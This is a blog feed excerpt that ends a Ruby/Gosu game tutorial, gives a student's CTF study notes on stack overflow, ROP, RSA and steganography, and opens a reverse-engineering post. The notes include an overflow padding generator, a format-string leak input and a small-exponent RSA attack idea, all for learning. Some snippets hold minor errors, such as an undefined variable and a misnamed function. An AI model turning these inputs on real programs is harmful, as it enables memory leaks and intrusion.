    &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;width&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 新增加一个球&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
      &lt;span class=&quot;vi&quot;&gt;@balls&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Ball&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@score&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在有那么点点太困难了… 我难以达到超过3000的分数. QAQ.&lt;/p&gt;

&lt;p&gt;嗯, 就是不知道球还剩下的血量, 所以我们应该再加入一些的内容. 
来让这个游戏更加有意思.&lt;/p&gt;

&lt;p&gt;首先我想搞颜色.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#draw(x, y, z = 0, scale_x = 1, scale_y = 1, color = 0xff_ffffff, mode = :default)&lt;/code&gt; =&amp;gt; void&lt;/p&gt;

  &lt;p&gt;Draws the image with its top left corner at (x, y).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;之前的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;方法的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;color&lt;/code&gt;我们不是还没有用过嘛, 所以我们现在利用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gosu::Color&lt;/code&gt;来上色. 
&lt;a href=&quot;https://www.rubydoc.info/gems/gosu/Gosu/Color&quot;&gt;原文档&lt;/a&gt;里面提供了一点点的颜色, 
所以我们现在就用简单的颜色来画这些球:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ball&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;  
      &lt;span class=&quot;vi&quot;&gt;@color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;GREEN&lt;/span&gt;                                                    
    &lt;span class=&quot;k&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;  
      &lt;span class=&quot;vi&quot;&gt;@color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;YELLOW&lt;/span&gt;                                                   
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;  
      &lt;span class=&quot;vi&quot;&gt;@color&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Color&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;RED&lt;/span&gt;  
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                              
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;   

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;                                                                           
    &lt;span class=&quot;c1&quot;&gt;# 球在子弹的上一层                                                               &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                                     
                &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;BALL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@scale&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后我们也想让球上显示球剩下的血量.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ball&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Font&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# ...&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw_text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@life&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                                                      
                    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@hf_height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;                                         
                    &lt;span class=&quot;no&quot;&gt;ZOrder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;UI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                                      
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以现在我们的游戏有点像样了. 但是是不是完美, 我的答案是绝对不是, 
我们还有很长的路要走…&lt;/p&gt;

&lt;p&gt;(先到这里告一段落, 我要去搞些&lt;del&gt;薯条&lt;/del&gt;新的玩具了. )&lt;/p&gt;</content><author><name></name></author><category term="ruby" /><summary type="html">Ruby &amp;amp; Gosu Make A Game 之前的博客基本上是学习的笔记的记录, 感觉自己输出的有点少了, 所以来点新鲜的, 写一个无聊的小游戏的制作, (又: 这个小游戏还是我在国航航班上玩到的一个小游戏, 有些魔性, 也有些好玩. ) 来作为ruby的一个简单的推广.</summary></entry><entry><title type="html">PWN &amp;amp; Crypto &amp;amp; Misc</title><link href="http://0.0.0.0:4000/ctf/pwn-crypto-misc/" rel="alternate" type="text/html" title="PWN &amp;amp; Crypto &amp;amp; Misc" /><published>2022-01-21T14:05:26+00:00</published><updated>2022-01-21T14:05:26+00:00</updated><id>http://0.0.0.0:4000/ctf/pwn-crypto-misc</id><content type="html" xml:base="http://0.0.0.0:4000/ctf/pwn-crypto-misc/">&lt;h1 id=&quot;pwn--crypto--misc&quot;&gt;PWN &amp;amp; Crypto &amp;amp; Misc&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;乱花渐欲迷人眼, 浅草才能没马蹄.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;感觉学起来有点点吃力, 但是我可以努力试试. 
因为这几天学的东西太多了, 但是掌握的情况又不是很好, 
只能够写下一些大概的点. 以后就看这些点来进行一个复(预)习.&lt;/p&gt;

&lt;h2 id=&quot;pwn&quot;&gt;PWN&lt;/h2&gt;
&lt;p&gt;学长介绍原理的时候主要介绍的网站是
&lt;a href=&quot;https://ctf-wiki.org&quot;&gt;ctf-wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这里就记录一下简单的原理和攻击.&lt;/p&gt;

&lt;h3 id=&quot;stack&quot;&gt;Stack&lt;/h3&gt;
&lt;p&gt;虽然之前也写过一个&lt;a href=&quot;../../../2021/11/04/stack.html&quot;&gt;超级烂的东西&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;但是当时应该是没有很明白, 导致现在学的时候就更不明白了. QAQ.&lt;/p&gt;

&lt;p&gt;现在是简单地把栈想成一个书架, 书架是从最上面开始向下面放书的, 
(数据从高地址向低地址增长).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Stack Overflow  &lt;br /&gt;
有一些函数比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;就会无限制地读取输入并写入栈中, 于是就会导致栈溢出.
    &lt;ul&gt;
      &lt;li&gt;ROP  &lt;br /&gt;
利用栈溢出的方法, 可以把栈的返回地址覆盖掉, 
让函数执行完毕以后(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eip&lt;/code&gt;)跳转到指定的位置去执行特定的代码. 
(据说可以利用类似的方法达到)
        &lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;form_playload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;times&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;succ!&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;可以这样构造一个函数用来输出一堆无用的填充, 
然后在调试器里面看最后返回的地址, 
然后计算出是第几个要被替换成要用的地址. 要利用的地址比如说是某个函数, 
或者是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;之类的东西, 还有就是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc&lt;/code&gt;地址.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Format String  &lt;br /&gt;
在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf(s)&lt;/code&gt;的时候, 假如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s&lt;/code&gt;是用户可控的话, 
就有办法利用格式化字符串输出任意地址的数据. 
一个简单的例子就是:
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%p.%p.%p.%p.%p.%s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;可能就会在输出了一堆地址之后输出一个字符串, 
然后这个字符串刚好就是我要知道的东西.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;heap&quot;&gt;Heap&lt;/h3&gt;
&lt;p&gt;(学长说读&lt;a href=&quot;https://elixir.bootlin.com/glibc/latest/source&quot;&gt;源码&lt;/a&gt;
是一种学习方法. 虽然现在还没有这个能力. )&lt;/p&gt;

&lt;p&gt;主要的问题是我现在也不是很熟… (没有遇到过)
所以这个就先留空… (尴尬)&lt;/p&gt;

&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;/h2&gt;
&lt;p&gt;学长是以RSA算法为例子为我们讲解的.&lt;/p&gt;

&lt;p&gt;(虽然我对密码学不是很理解, 但是感觉能够接受一些. )&lt;/p&gt;

&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
&lt;p&gt;推荐的工具是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mathematica&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SageMath&lt;/code&gt;, 用来计算(解决数学问题), 
这两个都得要好好学一遍…&lt;/p&gt;

&lt;p&gt;(之前&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mma&lt;/code&gt;接触的时候只是了解了如何解方程, 还有简单的画图之类的, 
对数论部分不太清楚. 而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sage&lt;/code&gt;又因为是python的, 所以有点不想用, 
于是就没学… 亏啊. )&lt;/p&gt;

&lt;h3 id=&quot;rsa算法介绍&quot;&gt;RSA算法介绍&lt;/h3&gt;
&lt;p&gt;简单的python代码:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# RSA 加密方法
# 密文是 ct = pt ** e mod N
# 明文是 pt = ct ** d mod N
# 公匙为 e, N
# 私匙为 d, N
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pt_txt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;balabala&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_to_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt_txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# RSA难以破解的关键之一就在于大数难以分解质因数
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BITS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getPrime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;q&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getPrime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;q&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 一般e是一个大数
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6337&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;ct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;一个例子&quot;&gt;一个例子&lt;/h3&gt;
&lt;p&gt;假如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e&lt;/code&gt;很小的话, 比如&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt;, 就可以尝试暴力枚举&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k&lt;/code&gt;, 
看是否满足&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gmpy2.iroot(ct + k * N, e)&lt;/code&gt;的输出是一个整数.&lt;/p&gt;

&lt;h3 id=&quot;密码学的类似方法&quot;&gt;密码学的类似方法&lt;/h3&gt;
&lt;p&gt;总之, 在密码学里面的问题往往是针对一个数学问题的解决, 
有时候就是某个人的论文的结果, 所以往往是利用数学做题. 
并且网络上的工具都是完善的. 直接用就好了.&lt;/p&gt;

&lt;p&gt;(又: 不要怕暴力枚举, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2 ** 22&lt;/code&gt;都是可以接受的数量级. )&lt;/p&gt;

&lt;h2 id=&quot;misc&quot;&gt;Misc&lt;/h2&gt;
&lt;p&gt;Misc里面, 凡是看到一点点的奇怪的东西, 不管怎么奇怪, 
都有隐藏信息的可能性. 并且在Misc里面对于编码的了解也是很重要的.&lt;/p&gt;

&lt;p&gt;实际上Misc里面的题目往往是一个对工具的利用的题目, 
常常需要学会对工具的使用. 并且还要见多识广.&lt;/p&gt;

&lt;h3 id=&quot;隐写&quot;&gt;隐写&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;图片&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;追加式文件隐写
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt;命令&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt;可以分析文件的区块&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;010editor&lt;/code&gt;等&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;文件结构隐写  &lt;br /&gt;
利用的是&lt;/li&gt;
  &lt;li&gt;LSB隐写  &lt;br /&gt;
原理就是利用人眼对颜色的分辨能力没有那么强, 
于是修改&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;音频隐写&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;追加隐写  &lt;br /&gt;
和追加式隐写差不多, 一般都是在靠头部和尾部的一段奇怪的编码.&lt;/li&gt;
  &lt;li&gt;频谱隐写  &lt;br /&gt;
特点就是声音听起来很刺耳, 转到频谱视角一般可以出结果.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;流量包&quot;&gt;流量包&lt;/h3&gt;
&lt;p&gt;一般会跟踪HTTP流而不是TCP流. 用到的是一个叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wireshark&lt;/code&gt;的工具.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;看HTTP&lt;/li&gt;
  &lt;li&gt;看DNS的隐写&lt;/li&gt;
  &lt;li&gt;关于SQL注入
一般是想要知道最后一次的得到的解&lt;/li&gt;
  &lt;li&gt;USB  &lt;br /&gt;
从source(比如说是3.2)到host(也就是电脑)的信息发送,&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;压缩包&quot;&gt;压缩包&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;爆破密码&lt;/li&gt;
  &lt;li&gt;CRC32校验  &lt;br /&gt;
可以利用文件的校验码来爆破, 前提是这个的样本要足够小,&lt;/li&gt;
  &lt;li&gt;明文攻击  &lt;br /&gt;
利用没有加密的文件来计算加密的文件, 对比的方法就是CRC校验,&lt;/li&gt;
  &lt;li&gt;伪加密  &lt;br /&gt;
特点是有一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;01&lt;/code&gt;的密码标志, 但是实际上没有被加密, 
需要尽可能的去试探. 类似于利用一个已知解缩小求解的范围.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;看不下去了, 这里写的这些实在是太水了. 希望以后可以逐渐变强一些.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">PWN &amp;amp; Crypto &amp;amp; Misc 乱花渐欲迷人眼, 浅草才能没马蹄.</summary></entry><entry><title type="html">RE</title><link href="http://0.0.0.0:4000/ctf/re/" rel="alternate" type="text/html" title="RE" /><published>2022-01-15T05:12:36+00:00</published><updated>2022-01-15T05:12:36+00:00</updated><id>http://0.0.0.0:4000/ctf/re</id><content type="html" xml:base="http://0.0.0.0:4000/ctf/re/">&lt;h1 id=&quot;reverse-engineering&quot;&gt;Reverse Engineering&lt;/h1&gt;
&lt;p&gt;逆向工程的作用目前对我来说就是一种能够将魔法一般的程序拉下神坛, 
将这个黑箱子里面的东西的秘密破解出来的技术.&lt;/p&gt;

&lt;p&gt;逆向工程的定义:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Reverse engineering, also called back engineering, 
is the process by which a man-made object is deconstructed to reveal its designs, 
architecture, or to extract knowledge from the object;  &lt;br /&gt;
– Wikipedia&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(这里面的知识有点多, 感觉自己没有很好地消化, 大概以后可以了解一些. )&lt;/p&gt;

&lt;h2 id=&quot;程序的构成的思想&quot;&gt;程序的构成的思想&lt;/h2&gt;
&lt;p&gt;有一点感觉, 但是没发很好地表达出来, 肯定是学的还不够到位, 
等闲下来我就开始着手看看这方面的书.&lt;/p&gt;

&lt;h3 id=&quot;组合&quot;&gt;组合&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;世界上最厉害的玩具是什么? 是积木.  &lt;br /&gt;
– 苏菲的世界&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;积木的种类可以不必很多, 但是积木却可以通过组合形成各种各样的不同的形状, 
譬如说积木可以组成一个拱形, &lt;strong&gt;arch&lt;/strong&gt;, 也就是古罗马人崇尚的形状. 
